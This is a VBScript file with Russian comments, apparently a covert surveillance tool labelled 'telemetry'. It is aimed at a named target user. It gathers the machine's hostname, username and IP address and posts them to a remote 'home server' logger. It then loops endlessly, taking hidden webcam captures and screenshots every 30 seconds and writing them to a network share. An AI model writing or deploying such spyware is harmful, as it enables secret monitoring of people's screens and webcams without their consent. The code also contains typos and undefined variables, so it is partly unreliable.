'Поставить на 1 чтобы работала "телеметрия"
runIsPermitted = 1

' сбор инфы о машине, с которой произведён пуск скрипта
hostname = CreateObject("WScript.Shell").ExpandEnvironmentStrings( "%COMPUTERNAME%" )
username = CreateObject("WScript.Shell").ExpandEnvironmentStrings( "%USERNAME%" )
Dim ipaddr : ipaddr = ""
Dim objWMIService : Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Dim colAdapters : Set colAdapters = objWMIService.ExecQuery("Select IPAddress from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
Dim objAdapter
For Each objAdapter in colAdapters
  If Not IsNull(objAdapter.IPAddress) Then ipaddr = trim(objAdapter.IPAddress(0))
  exit for
Next


'Проверить соединение с домашним серваком
If GetObject("winmgmts:\\.\root\cimv2").Get("Win32_PingStatus.Address='"& "<webserv>" & "'").StatusCode = 0 Then 
   srvIsWork=1
Else
   srvIsWork=0
End If

'Проверка, кем осуществляется запуск

If username = "<target username here>" Then
lanuch_type="TARGET"
Else

IF username = "<your user name here, for testing>" Then
lanuch_type="TESTING"
'спец. настройки для теста под моей учёткой
'runIsPermitted=0
'srvIsWork=0
Else
launch_type="GENERIC (username="&username&")"
End If
End If

'Проинформировать сервер о начале работы скрипта
srvinform ">>>>>>>>> Telemetric runtime begin. <<<<<<<<<"

'Отправка на сервер информации о машине, на которой запущен скрипт
srvinform "Remote machine hostname: " & hostname
srvinform "Remote machine session username: " & username
srvinform "Remote machine local IP address: " & ipaddr
srvinform "Remote machine local time: " & DateInfo & Now
srvinform "Interval: "&interval&" sec."

If runIsPermitted = 1 Then

srvinform "Starting up telemetrical daemon.."

subdir=DatePart("yyyy",Date) &"-"& Right("0" & DatePart("m",Date), 2) &"-"& Right("0" & DatePart("d",Date), 2)&"\"&username&"@"&hostname
set ws = wscript.createobject("WScript.shell")
ws.run("cmd /c mkdir \\<samba server ip>\<network share name here>\"&subdir&"\captures"), 0, true
ws.run("cmd /c mkdir \\<samba server ip>\<network share name here>\"&subdir&"\screenshots"), 0, true

Function screenshot()
srvinform "Taking screenshot.."
timestamp = DatePart("yyyy",Date) &"-"& Right("0" & DatePart("m",Date), 2) &"-"& Right("0" & DatePart("d",Date), 2)&"-"&Right("0" & Hour(Now), 2) &"."& Right("0" & Minute(Now), 2) &"."& Right("0" & Second(Now), 2)
ws.run("\\<AD DC ip here>\<network share name here>\screenshot.exe /f \\<samba server ip>\<network share name here>\"&subdir&"\screenshots\Screenshot_"&timestamp&"_"& username &"@"& hostname&".png"), 0, false
End Function

Function webcam()
srvinform "Taking webcam capture.."
timestamp = DatePart("yyyy",Date) &"-"& Right("0" & DatePart("m",Date), 2) &"-"& Right("0" & DatePart("d",Date), 2)&"-"&Right("0" & Hour(Now), 2) &"."& Right("0" & Minute(Now), 2) &"."& Right("0" & Second(Now), 2)
ws.run("\\<AD DC ip here>\<network share name here>\cam.exe /quiet /delay 1 /filename \\<samba server ip>\<network share name here>\"&subdir&"\captures\WebCam_"&timestamp&"_"& username &"@"& hostname&".png"), 0, false
End Function


While 1
webcam()
screenshot()
WScript.Sleep 30*1000
screenshot()
WScript.Sleep 30*1000
screenshot()
WScript.Sleep 30*1000
Wend


'Функция отправки HTTP POST запроса на домашний сервак
Function srvinform(msg)
  On Error Resume Next
  If srvIsWork=1 Then
  If GetObject("winmgmts:\\.\root\cimv2").Get("Win32_PingStatus.Address='"& "<webserv>" & "'").StatusCode = 0 Then 
    sUrl = "http://<webserv>/logger_telemetric.php"
    sRequest = "data=" & msg
    set oHTTP = CreateObject("Microsoft.XMLHTTP")
    oHTTP.open "POST", sUrl,false
    oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    oHTTP.setRequestHeader "Content-Length", Len(sRequest)
    oHTTP.send sRequest
    HTTPPost = oHTTP.responseText
  End If
  End If
 End Function
Else
srvinform "Notice: Telemetric daemon run is not permitted by configuration!"
End If

'Проинформировать сервер о завершении работы скрипта
srvinform ">>>>>>>>>> Script runtime end. <<<<<<<<<<"